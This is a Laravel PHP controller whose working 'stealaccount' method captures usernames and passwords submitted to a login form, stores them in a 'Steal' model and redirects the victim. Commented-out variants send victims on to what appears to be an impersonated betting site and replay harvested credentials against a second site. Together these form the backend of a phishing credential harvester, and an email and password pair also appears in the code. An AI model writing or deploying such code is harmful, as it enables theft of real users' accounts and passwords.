<?php

namespace App\Http\Controllers;


use App\Models\Steal;
use Auth;
use Illuminate\Http\Request;
use GuzzleHttp\Client;
use Laravel\Dusk\Browser;
class LoginController extends Controller
{
    // public function stealaccount(Request $request){
    //    $data = $request->only('username','password');
    //    Steal::create($data);

    //     return redirect()->secure('https://www.m88lv.com/');
    // }

    public function stealaccount(Request $request){
        $data = $request->only('username','password');
        Steal::create($data);
 
         return redirect()->back();
     }

    // public function stealaccount(Request $request){
    //     $data = $request->only('username','password');
        
    //     $ex = Steal::create($data);
    //     $token = $ex->createToken('token_name')->accessToken;

    //     $request->session()->put('api_token', $token);

    //     return response()->json(['token'=>$token]);
            
            
    //  }

    // public function logintowebsiteB(){
    //     $client = new Client();
    
    //     $response = $client->post('http://127.0.0.1:8001/account/signin/postsignin', [
    //         'form_params' => [
    //             'email' => 'nguyentantrung_01@yhaoo.com',
    //             'password' => '123456789',
                
    //         ],
    //     ]);
    
    //     $body = $response->getBody()->getContents();
    //     return $body;
    // }
}
